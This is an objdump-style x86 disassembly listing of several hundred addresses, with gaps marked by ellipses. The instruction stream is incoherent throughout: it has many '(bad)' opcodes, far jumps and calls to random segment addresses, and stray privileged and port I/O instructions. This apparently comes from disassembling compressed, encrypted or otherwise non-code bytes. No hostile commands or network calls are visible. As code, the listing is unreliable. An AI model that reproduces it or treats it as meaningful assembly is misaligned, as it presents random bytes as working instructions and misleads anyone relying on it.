  42ef73:	rcl    BYTE PTR [eax+0x16],1
  42ef76:	into   
  42ef77:	test   al,0xdb
  42ef79:	push   ss
  42ef7a:	xor    bl,bl
  42ef7c:	or     al,0x12
  42ef7e:	push   cs
  42ef7f:	jl     0x42efff
  42ef81:	idiv   edi
  42ef83:	mov    edi,0x9001351a
  42ef88:	cmp    ebp,DWORD PTR [edx-0x1b]
  42ef8b:	push   ebx
  42ef8c:	popf   
  42ef8d:	popf   
  42ef8e:	pusha  
  42ef8f:	fisub  DWORD PTR [edx+0x2e3eb292]
  42ef95:	je     0x42ef28
  42ef97:	mov    bh,0x7e
  42ef99:	pop    es
  42ef9a:	inc    esp
  42ef9b:	dec    edi
  42ef9c:	imul   edi,DWORD PTR [ecx],0xffffffd4
  42ef9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efa0:	adc    cl,BYTE PTR [eax+0x5fe8586c]
  42efa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efa7:	mov    ebx,0x853a8bd0
  42efac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efad:	jnp    0x42f022
  42efaf:	or     al,0xcb
  42efb1:	imul   edx,DWORD PTR [ecx+0x1d],0x79
  42efb5:	ja     0x42f026
  42efb7:	out    0x1d,eax
  42efb9:	cmc    
  42efba:	dec    edi
  42efbb:	nop
  42efbc:	xor    al,0x4e
  42efbe:	pop    edx
  42efbf:	retf   
  42efc0:	dec    esp
  42efc1:	sbb    dh,ah
  42efc3:	fisub  WORD PTR ss:[edi]
  42efc6:	and    DWORD PTR [esp-0x35],ebx
  42efca:	pop    ebp
  42efcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efcc:	jnp    0x42efd0
  42efce:	(bad)  
  42efd0:	retf   0xe5cf
  42efd3:	fcmovbe st,st(2)
  42efd5:	mov    ebp,0x7fbdf3d4
  42efda:	cmp    dh,BYTE PTR [ecx-0x7276b602]
  42efe0:	sti    
  42efe1:	pop    edx
  42efe2:	pop    es
  42efe3:	xchg   edx,ebx
  42efe5:	sub    esi,eax
  42efe7:	mov    eax,0x26d7034b
  42efec:	lea    esp,[ecx+0x7a]
  42efef:	test   al,bh
  42eff1:	enter  0x6477,0x41
  42eff5:	les    edi,FWORD PTR [ebp+ebx*1+0x74ef4739]
  42effc:	jg     0x42f07d
  42effe:	mov    ds:0x78a09348,al
  42f003:	jmp    0xe9151527
  42f008:	mov    ebp,0x442c7b77
  42f00d:	sub    DWORD PTR [edx],ebp
  42f00f:	lock fld QWORD PTR [eax]
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	scas   eax,DWORD PTR es:[edi]
  42f081:	repz int3 
  42f083:	enter  0xf881,0x1
  42f087:	add    BYTE PTR ds:0xc9000001,al
  42f08d:	out    0x5e,al
  42f08f:	xchg   ax,ax
  42f091:	into   
  42f092:	es aam 0x60
  42f095:	shl    BYTE PTR [ebx],1
  42f097:	out    0x52,al
  42f099:	sub    bl,BYTE PTR [ebp+0x32]
  42f09c:	iret   
  42f09d:	cmp    al,0x39
  42f09f:	icebp  
  42f0a0:	jne    0x42f061
  42f0a2:	repnz test al,0xb2
  42f0a5:	pop    ss
  42f0a6:	sbb    eax,0x6dc2a4e1
  42f0ab:	or     al,BYTE PTR [esp+ebp*8-0x7]
  42f0af:	in     al,dx
  42f0b0:	add    al,0xa0
  42f0b2:	das    
  42f0b3:	adc    esp,DWORD PTR [ebx-0x36]
  42f0b6:	mov    edx,?
  42f0b8:	addr16 mov eax,0x90ba8235
  42f0be:	adc    al,0x7f
  42f0c0:	adc    BYTE PTR [eax],dh
  42f0c2:	imul   esi,DWORD PTR [ebx],0xffffffa2
  42f0c5:	mov    edi,0x6961a870
  42f0ca:	mov    BYTE PTR [esi+ebp*4-0x4e],ch
  42f0ce:	adc    ebx,ebx
  42f0d0:	mov    eax,ds:0xe9cd4698
  42f0d5:	popf   
  42f0d6:	and    eax,DWORD PTR [esi-0x6e]
  42f0d9:	push   edx
  42f0da:	and    BYTE PTR [ecx-0x4],ch
  42f0dd:	mov    dh,BYTE PTR [edi-0x75]
  42f0e0:	pop    ds
  42f0e1:	nop
  42f0e2:	mov    fs,WORD PTR [ebp+0x2b]
  42f0e5:	fwait
  42f0e6:	shr    DWORD PTR [edi+0x42],1
  42f0e9:	and    ch,BYTE PTR [ebx+0x1c]
  42f0ec:	lods   al,BYTE PTR ds:[esi]
  42f0ed:	mov    al,ds:0xbdb407c6
  42f0f2:	imul   ecx,DWORD PTR [edi+0x4a],0x14
  42f0f6:	xor    al,0x9b
  42f0f8:	je     0x42f0fe
  42f0fa:	adc    edx,DWORD PTR [edx+eiz*1-0x607ada7e]
  42f101:	xlat   BYTE PTR ds:[ebx]
  42f102:	push   ecx
  42f103:	sbb    BYTE PTR [edx],ch
  42f105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f106:	(bad)
  42f109:	scas   al,BYTE PTR es:[edi]
  42f10a:	adc    eax,0xf2301793
  42f10f:	xchg   ebp,eax
  42f110:	mov    ecx,0xc1e0d14e
  42f116:	stc    
  42f117:	(bad)
  42f11a:	mov    ecx,0xdb796c68
  42f11f:	clc    
  42f120:	sahf   
  42f121:	sub    BYTE PTR [eax+0x77386f31],0x53
  42f128:	mov    ds:0x4c9ce8af,eax
  42f12d:	cpuid  
  42f12f:	mov    ecx,DWORD PTR [ecx+0x4d35bec8]
  42f135:	jmp    0xdb0d:0xec1ebaaa
  42f13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f13d:	in     eax,dx
  42f13e:	jnp    0x42f123
  42f140:	inc    esp
  42f141:	imul   ebp,edi,0xd64e986e
  42f147:	adc    eax,0x75a278ce
  42f14c:	je     0x42f135
  42f14e:	dec    edi
  42f14f:	inc    ebx
  42f150:	sub    ebp,DWORD PTR [edx-0x66]
  42f153:	xchg   esp,eax
  42f154:	ins    BYTE PTR es:[edi],dx
  42f155:	es pop esp
  42f157:	jp     0x42f0d9
  42f159:	mov    DWORD PTR [edx-0x26],esp
  42f15c:	test   BYTE PTR [ecx+0x5f],bh
  42f15f:	dec    edx
  42f160:	retf   
  42f161:	inc    ebp
  42f162:	jnp    0x42f1db
  42f164:	inc    esi
  42f165:	out    dx,eax
  42f166:	into   
  42f167:	jl     0x42f10b
  42f169:	adc    BYTE PTR [ebx-0x2fe69557],0x8e
  42f170:	inc    ebp
  42f171:	gs cdq 
  42f173:	fistp  WORD PTR [edi]
  42f175:	fadd   st(3),st
  42f177:	into   
  42f178:	inc    esi
  42f179:	call   DWORD PTR [ecx-0x21]
  42f17c:	or     BYTE PTR [ebx-0xedd565e],al
  42f182:	ins    DWORD PTR es:[edi],dx
  42f183:	fstp   TBYTE PTR [ebx-0x10a873ec]
  42f189:	fs xor al,0x4f
  42f18c:	add    al,0x9
  42f18e:	imul   edx,DWORD PTR [edx-0x68],0x0
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	add    eax,0x863f25ed
  42f205:	stc    
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0x86000001
  42f20d:	(bad)  
  42f20e:	fs cmp eax,0xcbb481ec
  42f214:	dec    edi
  42f215:	inc    edi
  42f216:	sub    edx,DWORD PTR [ebx+0x3db14b3e]
  42f21c:	pop    es
  42f21d:	cmp    eax,0x884034d6
  42f222:	xchg   edx,eax
  42f223:	add    ebx,eax
  42f225:	push   edi
  42f226:	sub    BYTE PTR [ecx-0x13],ah
  42f229:	pop    ebx
  42f22a:	jmp    0x3f52:0x18a4c42a
  42f231:	ins    BYTE PTR es:[edi],dx
  42f232:	lahf   
  42f233:	inc    esi
  42f234:	jmp    0x5da3:0x52063250
  42f23b:	int    0x64
  42f23d:	into   
  42f23e:	pop    esp
  42f23f:	adc    ebp,ecx
  42f241:	push   ds
  42f242:	ja     0x42f222
  42f244:	jns    0x42f259
  42f246:	ins    DWORD PTR es:[edi],dx
  42f247:	out    0x1f,eax
  42f249:	xor    ah,BYTE PTR [eax+ebx*2]
  42f24c:	mov    dl,0x3
  42f24e:	idiv   DWORD PTR [edi-0x1854b0e5]
  42f254:	cs pushf 
  42f256:	in     eax,dx
  42f257:	(bad)  
  42f258:	cwde   
  42f259:	inc    esp
  42f25a:	scas   eax,DWORD PTR es:[edi]
  42f25b:	and    DWORD PTR [edx-0x7d],edi
  42f25e:	xor    eax,DWORD PTR [ecx]
  42f260:	not    BYTE PTR [esi+0x48b3dd70]
  42f266:	lahf   
  42f267:	cmp    bl,dl
  42f269:	in     al,0xf7
  42f26b:	mov    ds:0xbbefd179,al
  42f270:	xchg   edx,eax
  42f271:	dec    ebp
  42f272:	pop    esi
  42f273:	ror    DWORD PTR [ebx+0x67],1
  42f276:	jl     0x42f2ea
  42f278:	mov    al,BYTE PTR [eax-0x39576c31]
  42f27e:	call   0xab49:0xeac40f4b
  42f285:	cmp    DWORD PTR [edi],ecx
  42f287:	pop    ebx
  42f288:	cmp    edx,esi
  42f28a:	int3   
  42f28b:	cmp    BYTE PTR [edi-0x1672912c],dh
  42f291:	cmp    bl,BYTE PTR [edx+edi*4+0x43]
  42f295:	mov    ds:0x21e8ca98,al
  42f29a:	cmp    eax,0xe7d8206d
  42f29f:	xor    eax,0xce29fbce
  42f2a4:	dec    eax
  42f2a5:	inc    edx
  42f2a6:	xchg   bh,cl
  42f2a8:	xchg   ecx,eax
  42f2a9:	cmp    cl,bl
  42f2ab:	mov    BYTE PTR cs:[edx],0xa4
  42f2af:	mov    edx,edx
  42f2b1:	push   ds
  42f2b2:	repnz mov DWORD PTR [ecx-0xe],edi
  42f2b6:	xchg   DWORD PTR [eax-0x2aa393de],esi
  42f2bc:	push   esp
  42f2bd:	scas   al,BYTE PTR es:[edi]
  42f2be:	pusha  
  42f2bf:	pop    ds
  42f2c0:	shl    DWORD PTR [esi-0x36],cl
  42f2c3:	pop    ecx
  42f2c4:	scas   eax,DWORD PTR es:[edi]
  42f2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2c6:	adc    DWORD PTR [eax+0x55],edx
  42f2c9:	and    eax,0x2d0f7862
  42f2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2cf:	push   0x2c0c71c2
  42f2d4:	sbb    al,0x98
  42f2d6:	push   ebx
  42f2d7:	repnz fwait
  42f2d9:	icebp  
  42f2da:	jecxz  0x42f320
  42f2dc:	jae    0x42f2a0
  42f2de:	add    eax,0xb043dbc5
  42f2e3:	push   ebx
  42f2e4:	dec    ecx
  42f2e5:	push   esp
  42f2e6:	jle    0x42f310
  42f2e8:	aas    
  42f2e9:	adc    eax,0x7ed91ed6
  42f2ee:	cmp    DWORD PTR [esi+0x2c417844],0xc6e9e518
  42f2f8:	sub    edx,edx
  42f2fa:	hlt    
  42f2fb:	into   
  42f2fc:	cdq    
  42f2fd:	out    0xcc,al
  42f2ff:	sbb    al,0xb1
  42f302:	pop    edi
  42f303:	inc    edx
  42f304:	adc    dh,BYTE PTR es:[edi-0x62e7c871]
  42f30b:	sub    eax,0xccc56399
  42f310:	add    al,BYTE PTR [eax]
	...
  42f372:	add    BYTE PTR [eax],al
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	push   esi
  42f381:	bound  edi,QWORD PTR ds:0x1fa8b63
  42f387:	add    BYTE PTR ds:0xb9000001,al
  42f38d:	push   edx
  42f38e:	test   al,0xd7
  42f390:	cmp    DWORD PTR [ebp+0x9],0x1b
  42f394:	mov    BYTE PTR [eax+0x50],bl
  42f397:	and    edi,ecx
  42f399:	cmp    BYTE PTR [eax+0x7f],ah
  42f39c:	add    BYTE PTR [esi+edi*2+0x1d],al
  42f3a0:	push   ecx
  42f3a1:	pop    edx
  42f3a2:	call   DWORD PTR [esi+0x2f]
  42f3a5:	sub    al,0xd5
  42f3a7:	cwde   
  42f3a8:	jmp    0xe40e:0xe3eb966d
  42f3af:	pop    es
  42f3b0:	dec    esp
  42f3b1:	or     DWORD PTR [eax-0x35],0xffffffc8
  42f3b5:	add    al,0x60
  42f3b7:	inc    edx
  42f3b8:	inc    esp
  42f3b9:	call   0xa443ec5e
  42f3be:	fcmovu st,st(6)
  42f3c0:	into   
  42f3c1:	lock inc esi
  42f3c3:	dec    BYTE PTR [ebx-0x1f]
  42f3c6:	sub    ecx,DWORD PTR [ebx]
  42f3c8:	push   ecx
  42f3c9:	inc    esp
  42f3ca:	xchg   ebx,eax
  42f3cb:	xor    BYTE PTR [edx+0x6daaa036],ch
  42f3d1:	xchg   esi,eax
  42f3d2:	pushf  
  42f3d3:	jae    0x42f39e
  42f3d5:	or     BYTE PTR [ebx+ecx*8+0x49],ch
  42f3d9:	loop   0x42f455
  42f3db:	ja     0x42f421
  42f3dd:	fidiv  WORD PTR [esi-0x74]
  42f3e0:	mov    esi,esi
  42f3e2:	jbe    0x42f434
  42f3e4:	dec    esi
  42f3e5:	enter  0x8552,0xf0
  42f3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f3ea:	(bad)  
  42f3eb:	cmp    eax,0x4d1221fb
  42f3f0:	(bad)  
  42f3f1:	mov    eax,ds:0x1e930f3e
  42f3f6:	(bad)  
  42f3f7:	lods   al,BYTE PTR ds:[esi]
  42f3f8:	(bad)  
  42f3fb:	addr16 leave 
  42f3fd:	neg    BYTE PTR [edi+eiz*1]
  42f400:	retf   
  42f401:	jb     0x42f3c8
  42f403:	sbb    eax,0xc2e52f72
  42f408:	and    al,0xb0
  42f40a:	xchg   edx,eax
  42f40b:	jae    0x42f3d7
  42f40d:	jae    0x42f3f9
  42f40f:	xchg   ebx,eax
  42f410:	icebp  
  42f411:	pop    ss
  42f412:	mov    esi,0xc4d6ca76
  42f417:	repnz pop esp
  42f419:	sbb    al,0x38
  42f41b:	(bad)  
  42f41c:	cmp    eax,0x783aa139
  42f421:	and    al,0x21
  42f423:	push   ds
  42f424:	(bad)  
  42f425:	(bad)  
  42f426:	retf   0xfce4
  42f429:	xchg   ecx,eax
  42f42a:	jmp    0x9f24:0xdf306c81
  42f431:	and    BYTE PTR [eax],dl
  42f433:	add    eax,0x2dc52b28
  42f438:	repz call 0xbd41:0x72ea9abb
  42f440:	mov    al,0xd1
  42f442:	ins    BYTE PTR es:[edi],dx
  42f443:	push   eax
  42f444:	add    esp,DWORD PTR [esi+0x52af6b96]
  42f44a:	dec    esp
  42f44b:	cli    
  42f44c:	lods   eax,DWORD PTR ds:[esi]
  42f44d:	cwde   
  42f44e:	jl     0x42f4b2
  42f450:	push   esp
  42f451:	dec    esp
  42f452:	(bad)  
  42f453:	xchg   edx,eax
  42f454:	sub    cl,ah
  42f456:	xchg   DWORD PTR [esi+0x6a4ea590],esp
  42f45c:	mov    esp,0xe64aa963
  42f461:	mov    ebp,0x4c08f795
  42f466:	inc    ebx
  42f467:	loop   0x42f40d
  42f469:	shl    ah,cl
  42f46b:	sbb    DWORD PTR [ebp-0x28],0x43796cb4
  42f472:	jmp    0x156d140b
  42f477:	popa   
  42f478:	inc    ebp
  42f479:	aam    0xb8
  42f47b:	pop    es
  42f47c:	loope  0x42f429
  42f47e:	pushf  
  42f47f:	cmp    DWORD PTR [ecx+0x29],eax
  42f482:	out    dx,eax
  42f483:	xchg   ebx,esp
  42f485:	add    al,0x22
  42f487:	es mov bl,0xc0
  42f48a:	das    
  42f48b:	shr    edi,0x91
  42f48e:	loop   0x42f4a5
  42f490:	nop
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	add    dh,BYTE PTR ds:0xfb906bdd
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x8000001
  42f50d:	xchg   ebx,eax
  42f50e:	(bad)  ds:0x8f06a926
  42f514:	push   0xffffffb6
  42f516:	cld    
  42f517:	lods   eax,DWORD PTR ds:[esi]
  42f518:	push   0xffffffd4
  42f51a:	mov    dh,0xfc
  42f51c:	imul   eax,ebx,0x71
  42f51f:	jl     0x42f534
  42f521:	push   edx
  42f522:	dec    edi
  42f523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f524:	jbe    0x42f585
  42f526:	xor    bh,BYTE PTR [ebx+eax*1-0x71]
  42f52a:	fild   QWORD PTR [ebx+0x7e3c616c]
  42f530:	mov    ebx,0x45423b5d
  42f535:	pusha  
  42f536:	inc    esp
  42f537:	cmp    eax,0x356d56a1
  42f53c:	ja     0x42f549
  42f53e:	fild   WORD PTR [ecx]
  42f540:	(bad)  
  42f541:	clc    
  42f542:	xchg   bl,ah
  42f544:	(bad)  
  42f545:	fisubr DWORD PTR [edx-0x1466043a]
  42f54b:	les    esp,FWORD PTR [edi-0x3b]
  42f54e:	sbb    BYTE PTR [ebp+0x70],dh
  42f551:	ins    BYTE PTR es:[edi],dx
  42f552:	imul   esp,DWORD PTR [eax],0x720ec560
  42f558:	xchg   esp,eax
  42f559:	or     eax,0xef70372c
  42f55e:	adc    al,0x7d
  42f560:	scas   eax,DWORD PTR es:[edi]
  42f561:	xor    DWORD PTR [edi],ebx
  42f563:	jle    0x42f55c
  42f565:	or     al,0x88
  42f567:	add    esi,DWORD PTR ds:0x91dc297c
  42f56d:	lea    edx,[esi]
  42f56f:	sub    al,0x4d
  42f571:	pop    eax
  42f572:	adc    al,0x51
  42f574:	pop    esi
  42f575:	sbb    al,0xe7
  42f577:	add    DWORD PTR [edi-0x147a0780],ebx
  42f57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f57e:	scas   eax,DWORD PTR es:[edi]
  42f57f:	push   esi
  42f580:	ds inc edx
  42f582:	dec    ebx
  42f583:	add    BYTE PTR [ebp-0x25],dl
  42f586:	int3   
  42f587:	push   cs
  42f588:	stc    
  42f589:	shl    dh,1
  42f58b:	inc    ebp
  42f58c:	sbb    eax,0x747c1e1d
  42f591:	test   al,0xef
  42f593:	cwde   
  42f594:	dec    ebp
  42f595:	lods   eax,DWORD PTR ds:[esi]
  42f596:	loopne 0x42f57d
  42f598:	xchg   ecx,eax
  42f599:	fs mov edi,cs
  42f59c:	cmc    
  42f59d:	and    DWORD PTR [esp+ecx*2-0x74],ebx
  42f5a1:	aad    0x40
  42f5a3:	push   ebp
  42f5a4:	int    0x3a
  42f5a6:	ja     0x42f5b2
  42f5a8:	xlat   BYTE PTR ds:[ebx]
  42f5a9:	ins    DWORD PTR es:[edi],dx
  42f5aa:	or     edx,esp
  42f5ac:	mov    bh,0x30
  42f5ae:	(bad)  
  42f5af:	jbe    0x42f598
  42f5b1:	fwait
  42f5b2:	push   eax
  42f5b3:	les    ecx,FWORD PTR [esi]
  42f5b5:	loop   0x42f5a3
  42f5b7:	sub    dh,bl
  42f5b9:	mov    ds:0x359c174e,eax
  42f5be:	adc    eax,0x5d17f0c3
  42f5c3:	clc    
  42f5c4:	or     ecx,DWORD PTR [edi+ebp*1-0xb748959]
  42f5cb:	data16 sbb al,0xc6
  42f5ce:	pop    esp
  42f5cf:	lock jae 0x42f5d7
  42f5d2:	xor    bh,bh
  42f5d4:	jne    0x42f594
  42f5d6:	sbb    dl,dh
  42f5d8:	dec    esi
  42f5d9:	mov    dh,0x97
  42f5db:	mov    ds,WORD PTR [eax-0x40]
  42f5de:	sbb    edx,0x27
  42f5e1:	shr    DWORD PTR [edx-0x43c4d6ff],cl
  42f5e7:	xchg   edx,eax
  42f5e8:	in     al,dx
  42f5e9:	mov    ebx,0xa1d99a02
  42f5ee:	xchg   DWORD PTR ds:0xe605619d,esp
  42f5f4:	xchg   ebx,eax
  42f5f5:	jl     0x42f651
  42f5f7:	popf   
  42f5f8:	jnp    0x42f619
  42f5fa:	imul   edi,DWORD PTR [edi],0xffffffd2
  42f5fd:	aam    0xa3
  42f5ff:	loopne 0x42f647
  42f601:	mov    dh,dl
  42f603:	xchg   ebx,eax
  42f604:	lods   al,BYTE PTR ds:[esi]
  42f605:	fcomi  st,st(7)
  42f607:	and    BYTE PTR ds:0x87a80cac,ah
  42f60d:	imul   esp,esp,0xa834
	...
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	jnp    0x42f674
  42f682:	loope  0x42f6f9
  42f684:	xchg   ebp,eax
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0x61000001
  42f68d:	xor    al,0x8c
  42f68f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f690:	adc    DWORD PTR [edx+0x1f],edx
  42f693:	sbb    BYTE PTR [ebx-0x44],al
  42f696:	mov    edi,DWORD PTR [ebx+0x7d67179e]
  42f69c:	cmp    edi,DWORD PTR [edx]
  42f69e:	rcl    DWORD PTR [edx-0x3269890b],1
  42f6a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6a5:	shr    BYTE PTR [ebx-0x3c],1
  42f6a8:	jns    0x42f724
  42f6aa:	push   edi
  42f6ab:	test   BYTE PTR [esp+eax*1],dh
  42f6ae:	push   ss
  42f6af:	in     eax,dx
  42f6b0:	aas    
  42f6b1:	sub    dh,dh
  42f6b3:	xor    eax,0xb33abb90
  42f6b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6b9:	dec    ecx
  42f6ba:	and    bh,BYTE PTR [ebx+edx*8-0x8eec5b7]
  42f6c1:	mov    dh,0x51
  42f6c3:	jbe    0x42f67b
  42f6c5:	test   BYTE PTR [ebp-0x4d75e4e3],dh
  42f6cb:	dec    esi
  42f6cc:	dec    esp
  42f6cd:	xor    DWORD PTR [edx],edx
  42f6cf:	jb     0x42f705
  42f6d1:	jecxz  0x42f6bf
  42f6d3:	push   ebp
  42f6d4:	hlt    
  42f6d5:	mov    WORD PTR [ebp-0x1f93bcba],?
  42f6db:	or     ebx,DWORD PTR [edx-0x73]
  42f6de:	cwde   
  42f6df:	inc    edx
  42f6e0:	aam    0xf5
  42f6e2:	dec    edi
  42f6e3:	inc    edx
  42f6e4:	sub    eax,0x6981963d
  42f6e9:	add    eax,0xbcdb77b5
  42f6ee:	adc    ch,ah
  42f6f0:	push   ebp
  42f6f1:	sbb    eax,0x7ac47394
  42f6f6:	mov    ebp,0x3bf6d431
  42f6fb:	jle    0x42f76f
  42f6fd:	mov    bh,0x2b
  42f6ff:	xor    bl,cl
  42f701:	mov    ah,0xbb
  42f703:	xchg   ecx,eax
  42f704:	mov    ebp,0x3a8d7024
  42f709:	mov    WORD PTR [eax],es
  42f70b:	push   edx
  42f70c:	adc    eax,0xd1c89a17
  42f711:	sub    BYTE PTR [ebx],cl
  42f713:	pop    esi
  42f714:	push   ebx
  42f715:	mov    ebx,0x642a497a
  42f71a:	dec    edi
  42f71b:	arpl   WORD PTR [ecx],dx
  42f71d:	shl    BYTE PTR [edx+edi*4-0x14],0x5e
  42f722:	or     dl,cl
  42f724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f725:	shr    DWORD PTR [ebx-0x1c],0x8e
  42f729:	cld    
  42f72a:	bound  esp,QWORD PTR [ebx-0x74]
  42f72d:	outs   dx,DWORD PTR ds:[esi]
  42f72e:	lods   eax,DWORD PTR ds:[esi]
  42f72f:	pop    ss
  42f730:	inc    ecx
  42f731:	cld    
  42f732:	push   esp
  42f733:	(bad)  
  42f734:	ins    DWORD PTR es:[edi],dx
  42f735:	scas   al,BYTE PTR es:[edi]
  42f736:	outs   dx,DWORD PTR ds:[esi]
  42f737:	adc    dl,0x87
  42f73a:	pop    esi
  42f73b:	and    dl,BYTE PTR [edi]
  42f73d:	or     BYTE PTR [ebp+eiz*4-0x3d7c8ca7],bh
  42f744:	add    BYTE PTR [edx+0x39],ah
  42f747:	setnp  BYTE PTR [edi-0x53]
  42f74b:	add    eax,0x76d465b5
  42f750:	retf   0x5126
  42f753:	xchg   DWORD PTR [ebx+esi*2],esp
  42f756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f757:	dec    esp
  42f758:	jmp    0x8f3a:0x5324bd0c
  42f75f:	pop    esp
  42f760:	push   ebx
  42f761:	mov    ss,edi
  42f763:	mov    ch,0xe7
  42f765:	nop
  42f766:	or     dl,BYTE PTR [ecx]
  42f768:	popa   
  42f769:	sub    eax,0xd27a99af
  42f76e:	aas    
  42f76f:	pop    ebx
  42f770:	repnz mov ecx,0x4e46ac0d
  42f776:	push   edx
  42f777:	jns    0x42f75b
  42f779:	mov    edx,0xe0be48ac
  42f77e:	adc    al,0x2a
  42f780:	popf   
  42f781:	push   ebx
  42f782:	xchg   esp,eax
  42f783:	sbb    DWORD PTR [edx-0x5aa8ba6d],ebx
  42f789:	sub    BYTE PTR [eax-0x50e16ed3],ah
  42f78f:	xchg   edi,eax
  42f790:	ret    
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x98e9b971
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [ecx+0x14],dl
  42f80e:	fsub   DWORD PTR [esi]
  42f810:	adc    BYTE PTR [ebx+0x26],dl
  42f813:	aam    0xac
  42f815:	cmp    al,0x1d
  42f817:	cli    
  42f818:	in     al,dx
  42f819:	out    dx,eax
  42f81a:	sbb    eax,0xb81bd930
  42f81f:	das    
  42f820:	cs xchg esi,eax
  42f822:	inc    edx
  42f823:	jbe    0x42f7d5
  42f825:	das    
  42f826:	and    dh,ah
  42f828:	cmp    edi,DWORD PTR ds:0xb2921dbf
  42f82e:	pusha  
  42f82f:	icebp  
  42f830:	and    bh,0x52
  42f833:	add    eax,DWORD PTR [edx-0x44ba87e1]
  42f839:	cmp    DWORD PTR [eax+0x311dd5e2],ebx
  42f83f:	call   0x807:0x8847a5ee
  42f846:	mov    al,0x9e
  42f848:	cli    
  42f849:	(bad)  
  42f84a:	in     al,0xec
  42f84c:	sub    ecx,DWORD PTR ds:0x2bc6a396
  42f852:	mov    edi,0x5374bca6
  42f857:	cmp    eax,0xd6593b2f
  42f85c:	xor    al,0x7f
  42f85e:	and    al,0x75
  42f860:	xor    al,0xa9
  42f862:	in     al,0x2b
  42f864:	repnz stc 
  42f866:	outs   dx,DWORD PTR ds:[esi]
  42f867:	icebp  
  42f868:	mov    esp,0x2d9d7582
  42f86d:	icebp  
  42f86e:	int3   
  42f86f:	lods   al,BYTE PTR ds:[esi]
  42f870:	addr16 pop eax
  42f872:	sub    DWORD PTR [ebx],0xffffffca
  42f875:	push   ebp
  42f876:	sbb    bl,ah
  42f878:	adc    eax,0xcf28af45
  42f87d:	adc    eax,0x6214377
  42f882:	mov    edi,0xbfd740ff
  42f887:	mov    ss,ebp
  42f889:	pop    ss
  42f88a:	xchg   BYTE PTR [ecx],ah
  42f88c:	cli    
  42f88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f88e:	pop    eax
  42f88f:	imul   edx,DWORD PTR [ebp-0x71],0x63a987bf
  42f896:	mov    ecx,0xb711c164
  42f89b:	mov    al,ds:0xfb50823b
  42f8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f8a1:	jmp    0x9f705596
  42f8a6:	xchg   ecx,eax
  42f8a7:	pushf  
  42f8a8:	cli    
  42f8a9:	into   
  42f8aa:	or     ecx,DWORD PTR [eax-0x4e]
  42f8ad:	xchg   DWORD PTR [edi+0x6c450e6],edx
  42f8b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8b4:	add    ah,BYTE PTR [ebx-0x17]
  42f8b7:	fcmovbe st,st(5)
  42f8b9:	fadd   DWORD PTR [ecx-0x5c]
  42f8bc:	pop    edx
  42f8bd:	enter  0x1851,0xee
  42f8c1:	sub    DWORD PTR [edi+0x4c82cb60],ecx
  42f8c7:	(bad)  
  42f8c8:	push   cs
  42f8c9:	mov    edx,0xc1f0a21
  42f8ce:	(bad)  
  42f8cf:	jno    0x42f93d
  42f8d1:	stos   BYTE PTR es:[edi],al
  42f8d2:	dec    ecx
  42f8d3:	ror    eax,cl
  42f8d5:	push   eax
  42f8d6:	test   al,0xaf
  42f8d8:	int    0xc3
  42f8da:	imul   ebp,DWORD PTR [ecx-0x1213687d],0xffffffcb
  42f8e1:	pop    ds
  42f8e2:	loopne 0x42f893
  42f8e4:	js     0x42f8a1
  42f8e6:	fs xchg edx,eax
  42f8e8:	xchg   esp,eax
  42f8e9:	mov    eax,ds:0x65fb6570
  42f8ef:	shl    BYTE PTR [ebx-0x57beaa87],1
  42f8f5:	sbb    bh,dh
  42f8f7:	inc    ebx
  42f8f8:	mov    ds:0xde4916d9,eax
  42f8fd:	xlat   BYTE PTR ds:[ebx]
